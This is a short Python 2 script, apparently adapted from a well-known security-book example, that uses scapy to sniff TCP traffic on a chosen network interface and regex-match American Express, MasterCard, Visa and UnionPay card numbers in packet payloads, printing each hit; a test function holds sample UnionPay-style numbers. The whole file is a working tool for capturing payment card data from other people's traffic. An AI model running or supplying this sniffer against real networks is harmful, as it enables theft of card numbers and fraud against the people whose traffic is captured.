#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
import optparse
from scapy.all import *


def findCreditCard(pkt):
    raw = pkt.sprintf('%Raw.load%')

    # 测试
    # raw = pkt

    americaRE = re.findall('3[47][0-9]{13}', raw)
    masterRE = re.findall('5[1-5][0-9]{14}', raw)
    visaRE = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)

    yinlian = re.findall('62[0-9]{14}', raw)
    yinlian_2 = re.findall('^62[0-9]{2}\x20[0-9]{4}\x20[0-9]{4}\x20[0-9]{4}', raw)

    if americaRE:
        print '[+] Found American Express Card: ' + americaRE[0]
    if masterRE:
        print '[+] Found MasterCard Card: ' + masterRE[0]
    if visaRE:
        print '[+] Found Visa Card: ' + visaRE[0]
    if yinlian:
        print '[+] 发现银联卡信息, 卡号：%s' % yinlian[0]
    if yinlian_2:
        print "[+] 发现带空格的银联卡信息，卡号：%s" % yinlian_2[0]

def main():

    # 测试
    # test()

    parser = optparse.OptionParser('usage %prog -i <interface>')
    parser.add_option('-i', dest='interface', type='string',\
      help='specify interface to listen on')
    (options, args) = parser.parse_args()

    if options.interface == None:
        print parser.usage
        exit(0)
    else:
        conf.iface = options.interface

    try:
        print '[*] Starting Credit Card Sniffer.'
        sniff(filter='tcp', prn=findCreditCard, store=0)

    except KeyboardInterrupt:
        exit(0)

def test():
    test_arr = []
    test_arr.append("6214830206373671")
    test_arr.append("6214 8302 0637 3671")

    for msg in test_arr:
        findCreditCard(msg)

if __name__ == '__main__':
    main()
